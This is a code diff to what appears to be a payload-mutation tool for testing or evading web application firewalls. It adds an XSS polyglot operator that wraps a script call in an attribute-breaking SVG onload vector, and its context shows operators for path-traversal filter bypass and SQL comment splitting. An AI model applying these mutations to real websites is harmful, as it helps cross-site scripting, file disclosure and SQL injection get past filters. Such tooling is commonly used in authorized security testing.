@@ -187,6 +187,21 @@ def xss_entity_obfuscate(payload: str) -> str:
     return out
 
 
+def xss_polyglot(payload: str) -> str:
+    """Emit a single canonical cross-context polyglot that fires BOTH in a
+    reflected-attribute context and in a raw tag context.
+
+    The leading `">` closes the (hypothetical) open attribute value AND the
+    enclosing tag; the trailing `<svg/onload=...>` is a minimal SVG vector
+    that runs on parse in a bare HTML context. Because the operator is a pure
+    deterministic transform (no randomness), its exact output is pinned in
+    tools/smoke.py as a regression tripwire.
+    """
+    m = re.search(r"(?:alert|confirm|prompt)\s*\([^)]*\)", payload, re.IGNORECASE)
+    call = m.group(0) if m else "alert(1)"
+    return f'"><svg/onload={call}>'
+
+
 def lfi_nested_traversal(payload: str) -> str:
     """Rewrites ../ as ....// (defeats naive single-pass '../' stripping)."""
     if "../" in payload or "..\\" in payload:
@@ -302,6 +317,7 @@ ALL_MUTATIONS = [
     xss_tag_vector_swap,
     xss_attr_breakout,
     xss_entity_obfuscate,
+    xss_polyglot,
     mysql_versioned_comment,
     whitespace_alt,
     sql_inline_comment_split,
@@ -322,7 +338,7 @@ OPERATORS_BY_CATEGORY = {
         case_randomize, add_whitespace_variants, insert_random_junk,
         html_entity_encode, url_encode_partial, script_null_byte_split,
         xss_event_handler_swap, xss_tag_vector_swap, xss_attr_breakout,
-        xss_entity_obfuscate, uri_case_fold,
+        xss_entity_obfuscate, xss_polyglot, uri_case_fold,
     ],
     "sqli": [
         case_randomize, add_sql_comment, add_whitespace_variants,
